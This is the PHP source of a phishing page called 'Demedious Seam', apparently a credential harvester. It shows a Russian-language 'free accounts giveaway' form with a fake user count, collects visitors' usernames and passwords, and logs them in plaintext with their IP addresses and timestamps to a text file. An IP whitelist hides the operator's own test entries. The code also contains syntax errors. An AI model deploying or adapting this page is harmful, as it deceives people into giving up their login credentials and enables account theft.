<?php

/*
	"Demedious Seam" - an account data logger, developed for WWW usage.
	
	The account data logger saves the collected data in a simple text file.
	However, you can configure .htaccess for restricting access to the file.

	Idea by Andrew "kroshmorkovkin" Ivanov and Larry "Diicorp95" Holst. UNLICENSE License.
*/

function mimetype($extension) {switch ($extension){case 'wav':return 'audio/wav';case 'ogg':return 'audio/ogg';case 'mp3':return 'audio/mpeg';}}

// Constants
const IP_LENGTH = 8;
const SAVE_TO = 'free-accounts-giveaway.txt';
const GETPAR_INFO = 'info'; // GET parameter

const HTML_LOGGER_NAME = 'Demedious Seam';
const MUSIC = false;
const HTML_MUSIC_FORMAT_EXT = null;
const HTML_MUSIC_PATH = null;
if (MUSIC) {
	define("music_tag",'<audio autoplay loop><source src="'.music_here().'" type="'.mimetype(HTML_MUSIC_FORMAT_EXT).'"></audio>');
	private static $MUSIC_LIST = array( // Filenames without extension
		
	);
} else {
	define("music_tag",'');
	private static $MUSIC_LIST = array();
}
const HTML_COPYRIGHT = '© Родители.';
const HTML_LAST_UPDATE = 'никогда';
const HOW_MANY_USERS = 333;

// On start
date_default_timezone_set('Europe/Moscow');
const SCRIPT_PATH = basename(__FILE__); // Change this

// Templates
define("info_page",''
.'<div class="adaptis-under">'.PHP_EOL
.'				<img alt="" src="success.gif" class="adaptis">'.PHP_EOL
.'				<div class="adaptis-1">Прочитайте внимательно!</div>'.PHP_EOL
.'				<div class="adaptis-2">Если ваша почта не будет актуальной,<br>мы отклоним вашу заявку.</div>'.PHP_EOL
.'				<form action="'.SCRIPT_PATH.'" method="post">'.PHP_EOL
.'					<input name="regform" value="false" type="hidden">'.PHP_EOL
.'					<input name="" class="button-windalike-okey" type="submit" value="Жду письма">'.PHP_EOL
.'				</form>'.PHP_EOL
.'			</div>'.PHP_EOL);
define("only_ask",''
// .'			<div class="tipinfo"><span class="hintlabel">Подсказка:</span>&nbsp;Это не страница для кражи паролей или чего-то ещё подобного. Однако, все данные введённые здесь передаются по HTTP. Вводите данные только при малой активности трафика доступа к этой странице! Для этого я поместил счётчик внизу страницы.</div>'.PHP_EOL
.'			<form action="'.SCRIPT_PATH.'" method="POST">'.PHP_EOL
.'			<input type="hidden" name="regform" value="true">'.PHP_EOL
.'			<div class="labelinput">'.PHP_EOL
.'			Имя пользователя:&nbsp;<input name="username" class="text-windalike" type="text" value="">'.PHP_EOL
.'			</div>'.PHP_EOL
.'			<div class="labelinput">'.PHP_EOL
.'			Пароль:&nbsp;<input name="password" class="text-windalike" type="password" value="">'.PHP_EOL
.'			</div>'.PHP_EOL
.'			<input name="b-login" class="button-windalike" type="submit" value="Отправить заявку">'.PHP_EOL
.'			</form>'.PHP_EOL);
define("howmanyonline",'<img alt="" src="loading.gif" style="vertical-align:middle;border:0;" border="0">');

// DEFINEs
function js_redirect($url) { echo('<script type="text/javascript">document.location.replace(\''.$url.'\');</script>'); }
function meta_redirect($url) { echo(chr(9).'<meta http-equiv="Refresh" content="0;URL='.$url.'">'); }

// Functions
function GetIP($anyway = false) {
	$whitelist = array();
	/*
		$whitelist instructions:

		Hash the IP address, truncate it to first
		(IP_LENGTH value, default - 8) characters,
		only then insert it into the array.
	*/

	// Thanks to Habr Q&A users for following code:
		if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
			$ip = $_SERVER['HTTP_CLIENT_IP'];
		} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
			$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		} else {
			$ip = $_SERVER['REMOTE_ADDR'];
		}
	// -*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-

	$will_return = $ip;

	if (!$anyway) {
		foreach ($whitelist as $key => $testip) {
			if (substr (md5($ip),0,IP_LENGTH) == $testip) {
				$will_return = 'me';
			}
		}
	}

	return $will_return;
}

function add_record($str1, $str2) {
	// Add a record to text database

	$return_from_info = true;
	js_redirect('?'.GETPAR_INFO);
	
	$newfile='LOGIN     : '.$str1.PHP_EOL.'PASSWORD  : '.$str2.PHP_EOL;
	if (GetIP() != "me") {
		$newfile .= 'DATE/TIME : '.date("H:i:s").' '.date("d/M/Y").PHP_EOL;
		$newfile .= 'IP ADDR.  : '.GetIP().PHP_EOL;
	} else {
		$newfile .= 'Don\'t react, because ADMINS ARE HAVING DEBUGGING FUN! ^^'.PHP_EOL;
	}

	$newfile .= PHP_EOL;
	file_put_contents(SAVE_TO, iconv("CP1257","UTF-8",$newfile), LOCK_EX | FILE_APPEND);
}

if (!function_exists('str_contains')) {function str_contains($haystack, $needle) { return $needle !== '' && mb_strpos($haystack, $needle) !== false; } }
function decho($string,$escape=true) {if ($escape) { $string=htmlspecialchars($string,ENT_QUOTES); } echo($string);}
function process_postdata($str) {$str = preg_replace('/[\x00-\x1F\x7F]/u','',$str);if (strlen($str) != strlen(utf8_decode($str)))utf8_decode($str);return $str;}

function music_here() {
	if (MUSIC) {		
		$_ = array_rand( $MUSIC_LIST,1 );
		return HTML_MUSIC_PATH.$MUSIC_LIST[$_].'.'.HTML_MUSIC_FORMAT_EXT;
	}
}

// Runtime
if ($_POST['regform'] == "false") {
	// If user proceeds to return to main menu
	js_redirect(SCRIPT_PATH);
}

// if ($_COOKIE['information'] == 'show')
if (isset($_GET[GETPAR_INFO]))
{
	$will_say = info_page;
/*
	unset($_COOKIE['information']);
	setcookie('information', null, -1, '/');
*/
}

if ($_POST['regform'] == "true") {
	// Before adding a record
	if (
		(!empty($_POST['username'])) and
		(!empty($_POST['password']))
	) {
		$go_to_into = true;
		$usernamez = process_postdata($_POST['username']);
		$passwordz = process_postdata($_POST['password']);
		add_record($usernamez, $passwordz);
	}
}

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<?/*
	You will most likely be using HTML5.
	So if you'll change the template and you're not sure, please also change the above line to <!DOCTYPE HTML>
*/?>
<html>
<head>
	<title><? decho(HTML_LOGGER_NAME); ?></title>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<?php
	if ($return_from_info) meta_redirect(SCRIPT_PATH);
	if ($go_to_into) meta_redirect(SCRIPT_PATH.'?'.GETPAR_INFO);
?>
	<link rel="stylesheet" href="style.css" type="text/css">
	<link rel="icon" href="favicon.ico" type="image/x-icon">
	<link rel="icon" href="favicon.png" type="image/png">
</head>
<body>
	<div class="site-content">
		<div class="windows-form">
			<div class="title">
			<img class="in-title" alt="" src="logotype.gif"><br>
			Добро пожаловать в <? decho(HTML_LOGGER_NAME); ?>!
			</div>
<?php

if ($will_say != "") {
	echo($will_say.PHP_EOL.music_tag);
} else {
	echo(only_ask);
}

?>
			<div class="footer">
			<? echo HTML_COPYRIGHT; ?><br>
			<br>
			Последнее обновление: <? decho(HTML_LAST_UPDATE); ?><br>
			Всего пользователей: <? decho(HOW_MANY_USERS ?><br>
			Онлайн пользователей: <? decho(howmanyonline,false); ?>
			</div>
		</div>
	</div>
</body>
</html>
